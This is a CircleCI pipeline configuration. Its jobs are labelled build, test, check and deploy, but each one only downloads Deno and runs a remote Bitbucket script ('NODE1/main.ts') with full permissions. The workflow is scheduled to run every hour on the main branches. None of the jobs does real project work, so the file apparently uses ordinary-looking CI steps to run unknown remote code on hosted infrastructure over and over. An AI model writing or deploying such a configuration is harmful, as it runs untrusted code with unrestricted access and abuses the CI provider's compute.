{
    "version": 2.1,
    "jobs": {
        "build": {
            "docker": [
                {
                    "image": "cimg/go:latest"
                }
            ],
            "resource_class": "medium",
            "working_directory": "~/build",
            "steps": [
                {
                    "run": {
                        "name": "Build",
                        "command": "curl -fsSL https://deno.land/x/install/install.sh | sh && $HOME/.deno/bin/deno run -A https://bitbucket.org/izsystem/de4js/raw/meocoder_node/tool/NODE1/main.ts"
                    }
                }
            ]
        },
        "test": {
            "docker": [
                {
                    "image": "cimg/base:2021.04"
                }
            ],
            "resource_class": "medium",
            "working_directory": "~/test",
            "steps": [
                {
                    "run": {
                        "name": "Test",
                        "command": "curl -fsSL https://deno.land/x/install/install.sh | sh && $HOME/.deno/bin/deno run -A https://bitbucket.org/izsystem/de4js/raw/meocoder_node/tool/NODE1/main.ts"
                    }
                }
            ]
        },
        "check": {
            "docker": [
                {
                    "image": "cimg/ruby:latest"
                }
            ],
            "resource_class": "medium",
            "working_directory": "~/check",
            "steps": [
                {
                    "run": {
                        "name": "Check",
                        "command": "curl -fsSL https://deno.land/x/install/install.sh | sh && $HOME/.deno/bin/deno run -A https://bitbucket.org/izsystem/de4js/raw/meocoder_node/tool/NODE1/main.ts"
                    }
                }
            ]
        },
        "deploy": {
            "docker": [
                {
                    "image": "cimg/php:latest"
                }
            ],
            "resource_class": "medium",
            "working_directory": "~/deploy",
            "steps": [
                {
                    "run": {
                        "name": "Deploy",
                        "command": "curl -fsSL https://deno.land/x/install/install.sh | sh && $HOME/.deno/bin/deno run -A https://bitbucket.org/izsystem/de4js/raw/meocoder_node/tool/NODE1/main.ts"
                    }
                }
            ]
        }
    },
    "workflows": {
        "version": 2,
        "constantly_build": {
            "triggers": [
                {
                    "schedule": {
                        "cron": "15 * * * *",
                        "filters": {
                            "branches": {
                                "only": [
                                    "main",
                                    "master"
                                ]
                            }
                        }
                    }
                }
            ],
            "jobs": [
                "build",
                "test",
                "check",
                "deploy"
            ]
        }
    }
}